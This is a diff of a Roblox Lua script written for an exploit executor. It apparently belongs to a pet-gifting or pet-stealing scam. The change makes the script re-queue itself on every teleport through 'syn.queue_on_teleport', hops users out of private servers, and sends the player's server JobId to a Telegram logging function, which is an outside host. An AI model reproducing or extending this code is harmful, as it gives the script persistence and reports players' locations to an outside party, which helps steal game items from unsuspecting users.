@@ -49,20 +49,27 @@ local function sendTelegramLog(reason)
 	pcall(function() requestFunc(payload) end)
 end
 
--- Main pet gifting loop (simplified)
-task.spawn(function()
-	while true do
-		task.wait(0.1)
-		-- Here you can add your gift/pickup functions if needed
-	end
-end)
+-- Queue this script to run after teleport
+if syn then
+	syn.queue_on_teleport(script.Source)
+elseif queue_on_teleport then
+	queue_on_teleport(script.Source)
+end
 
--- Immediately hop to the same place
-TeleportService:Teleport(PLACE_ID, LocalPlayer)
+-- Only hop if in a private server
+if Players.PrivateServerId then
+	debugPrint("Private server detected. Hopping...")
+	TeleportService:Teleport(PLACE_ID, LocalPlayer)
+else
+	debugPrint("Public server detected. No hop will be done.")
+	-- Send JobId immediately for public server
+	sendTelegramLog("Started in public server")
+end
 
--- After joining new server, send JobId
+-- Send JobId after teleport
 Players.PlayerAdded:Connect(function(plr)
 	if plr == LocalPlayer then
+		debugPrint("Player joined after hop, sending JobId")
 		sendTelegramLog("Joined new server after hop")
 	end
 end)
